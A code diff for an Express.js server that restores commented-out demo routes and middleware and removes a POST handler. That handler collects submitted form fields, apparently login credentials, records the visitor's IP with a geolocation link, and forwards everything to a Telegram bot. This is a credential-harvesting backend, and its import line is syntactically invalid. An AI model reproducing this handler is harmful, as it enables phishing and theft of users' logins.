@@ -3,7 +3,6 @@ import express from 'express'
 import cors from 'cors'
 import morgan from 'morgan'
 import bodyParser from 'body-parser'
-import node-telegram-bot-api from 'node-telegram-bot-api'
 import compression from 'compression'
 import customLogger from '../utils/logger'
 
@@ -67,71 +66,33 @@ export default function expressApp(functionName) {
     res.send(html)
   })
 
-//   router.get('/users', (req, res) => {
-//     res.json({
-//       users: [
-//         {
-//           name: 'steve',
-//         },
-//         {
-//           name: 'joe',
-//         },
-//       ],
-//     })
-//   })
+  router.get('/users', (req, res) => {
+    res.json({
+      users: [
+        {
+          name: 'steve',
+        },
+        {
+          name: 'joe',
+        },
+      ],
+    })
+  })
 
-//   router.get('/hello/', function(req, res) {
-//     res.send('hello world')
-//   })
+  router.get('/hello/', function(req, res) {
+    res.send('hello world')
+  })
 
-//   // Attach logger
-//   app.use(morgan(customLogger))
+  // Attach logger
+  app.use(morgan(customLogger))
 
-//   // Setup routes
-//   app.use(routerBasePath, router)
+  // Setup routes
+  app.use(routerBasePath, router)
 
-//   // Apply express middlewares
-//   router.use(cors())
-//   router.use(bodyParser.json())
-//   router.use(bodyParser.urlencoded({ extended: true }))
+  // Apply express middlewares
+  router.use(cors())
+  router.use(bodyParser.json())
+  router.use(bodyParser.urlencoded({ extended: true }))
 
-app.get('/', function(req, res){
-   res.render('form');
-});
-
-app.set('view engine', 'pug');
-app.set('views', './views');
-
-// for parsing application/json
-app.use(bodyParser.json()); 
-
-// for parsing application/xwww-
-app.use(bodyParser.urlencoded({ extended: true })); 
-//form-urlencoded
-
-
-app.post('/', function(req, res){
-   res.header("Access-Control-Allow-Origin", "*");
-   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
-   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  
-   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
-       let msg='';
-  for (let [key, value] of Object.entries(req.body.val)) {
-  msg +=key+' : '+ value+'\n';
- 
-}
-msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
-     
-   console.log(msg);
-
-
-// Create a bot that uses 'polling' to fetch new updates
-const bot = new node-telegram-bot-api(req.body.tok, {polling: true});
-
-bot.sendMessage(req.body.telid, msg);
-   res.send("recieved your request!");
-});
   return app
 }
